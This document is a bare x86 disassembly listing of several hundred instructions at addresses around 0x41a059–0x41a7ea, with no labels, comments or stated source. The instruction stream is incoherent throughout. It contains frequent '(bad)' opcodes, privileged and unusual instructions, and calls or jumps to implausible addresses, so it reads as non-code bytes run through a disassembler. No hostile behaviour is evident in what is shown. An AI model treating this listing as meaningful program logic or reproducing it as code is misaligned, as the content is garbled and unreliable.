  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
